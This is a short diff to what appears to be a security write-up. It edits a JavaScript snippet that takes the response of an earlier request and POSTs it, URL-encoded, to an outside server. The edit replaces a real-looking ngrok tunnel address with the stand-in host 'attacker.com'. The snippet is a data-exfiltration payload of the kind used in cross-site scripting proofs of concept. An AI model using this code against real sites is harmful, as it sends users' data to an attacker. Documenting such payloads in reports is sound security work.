@@ -126,7 +126,7 @@ req1.send();
 var response = req1.responseText;
 var req2=new XMLHttpRequest();
 var params = "data=" + encodeURIComponent(response);
-req2.open("POST", "http://20bf-141-168-116-205.ngrok.io/caue", true);
+req2.open("POST", "http://attacker.com/caue", true);
 req2.setRequestHeader('Content-Type', 'application/x-www-urlencoded')
 req2.send(params);
 ```
